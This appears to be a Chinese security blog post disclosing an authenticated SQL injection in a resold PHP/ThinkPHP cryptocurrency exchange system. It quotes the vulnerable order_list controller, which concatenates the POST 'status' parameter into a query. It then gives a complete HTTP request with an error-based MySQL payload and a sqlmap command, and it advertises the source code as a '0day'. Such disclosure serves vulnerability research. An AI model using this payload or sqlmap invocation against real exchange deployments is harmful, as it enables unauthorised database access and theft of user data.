#  某优化版PHP九国语言交易所存在前台SQL注入漏洞   
原创 Mstir  星悦安全   2025-06-04 06:38  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字  
关注我们 并设为  
星标  
## 0x00 前言  
  
**项目编号 : 10035    内部编号:XY-101724**  
  
**某优化版PHP九国语言交易所系统源码/秒合约交易源码/币币合约/c2c/质押投资，前端uni-app，后端php，修复了一些报错和优化了一些细节，前后端均正常，需要开启一些端口**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5eGLUlgg5CxF4RByHeaIHvEymf0vaf9Qe0ShFbFsSbUFTmDnGa53KRf11ZaxFbsdghLuy8wnFcmNw/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5eGLUlgg5CxF4RByHeaIHvEIDD8rUTC3axt6IFGpRL98mTkjuYeEUm0LIVNkWhRZO5YKxbQGy9oHg/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5eGLUlgg5CxF4RByHeaIHvELcSI6VkicWYtcIsT9Lrw8fvAiafFrwubnYJ5VnqyIO2xGpt0tia5icchqA/640?wx_fmt=png&from=appmsg "")  
  
**框架:ThinkPHP 5.0.24 Debug:True**  
## 0x01 漏洞研究&复现  
  
需前台用户登录权限  
  
**位于 /application/api/controller/Marketotc.php 控制器的 order_list 方法通过 $this->request->post 传入status 参数，然后直接进入到SQL查询字句中，导致漏洞产生.**  
  
****  
```
/*** 我的订单列表*/
public function order_list()  {
    $user_id = $this->auth->id;
    $type = $this->request->post("type");//1=买入，2=卖出
    $status = $this->request->post("status",0);//状态:1=待付款,2=已付款,3=申诉中,4=已完成,5=已取消
    if($type == 1){
      $w = "((a.user_id = ".$user_id." AND a.type=1) OR (a.relid = ".$user_id." AND a.type=2))";
    }elseif($type == 2){
      $w = "((a.user_id = ".$user_id." AND a.type=2) OR (a.relid = ".$user_id." AND a.type=1))";
    }else{
      $w = "(a.user_id = ".$user_id." OR a.relid = ".$user_id.")";
    }
    if($status){
      $w .= " AND a.status=".$status;
    }
    $user_market = Db::name("app_market_user a")
      ->field("a.id,a.num,a.price as count_price,b.price,a.status,a.add_time,b.payment,a.type,a.relid,a.user_id,b.type as types,c.name,d.curr_name as fb_name,d.symbol")
      ->join("app_market b","a.order_id=b.id","left")
      ->join("app_currency c","b.curr_id=c.id","left")
      ->join("app_market_country d","b.country_id=d.id","left")
      ->where($w)
      ->order("a.id desc")
      ->paginate(20, false, ['query' => request()->param()]);
    foreach ($user_market as $key => $value) {
      if($value['user_id'] == $user_id){
        $user = Db::name("user")->where("id",$value['relid'])->find();
        $value['nickname'] = $user['nickname'];
        $value['avatar'] = Config::get("site.image_url").$user['avatar'];
      }else{
        $user = Db::name("user")->where("id",$value['user_id'])->find();
        $value['nickname'] = $user['nickname'];
        $value['avatar'] = Config::get("site.image_url").$user['avatar'];
        $value['type'] =$value['types'];
      }
      $value['num'] = floatval($value['num']);
      $value['add_time'] = date("Y-m-d H:i",$value['add_time']);
      unset($value['types']);
      unset($value['relid']);
      $user_market[$key] = $value;
    }

    $this->success("ok",$user_market);
  }

```  
  
  
**Payload:**  
  
```
POST /api/Marketotc/order_list HTTP/1.1
Host: 192.168.200.128
Content-Length: 50
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Origin: http://192.168.200.128
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.200.128/api/Marketotc/order_list
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cookie: PHPSESSID=0pu2ediqfhu5ibuq90pbgnefab; think_var=zh-cn; uid=3728; token=a89eab28-e6a4-48fa-8f46-de7af8053c6e
Connection: close

status=GTID_SUBSET(CONCAT((SELECT (USER()))),8627)

```  
  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5eGLUlgg5CxF4RByHeaIHvEAQDGc5mc6psc3MTxWruRWJtJo3CVETPvIa6GnZymkUMnJaKTTYBBJA/640?wx_fmt=other&from=appmsg "")  
```
Python sqlmap.py -r a.txt --level=3 --dbms=mysql
```  
```

```  
  
## 0x02 源码下载  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，交易所**  
  
**交易所源码关注公众号发送 250604 下载!**  
  
****  
  
****  
**免责声明:文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
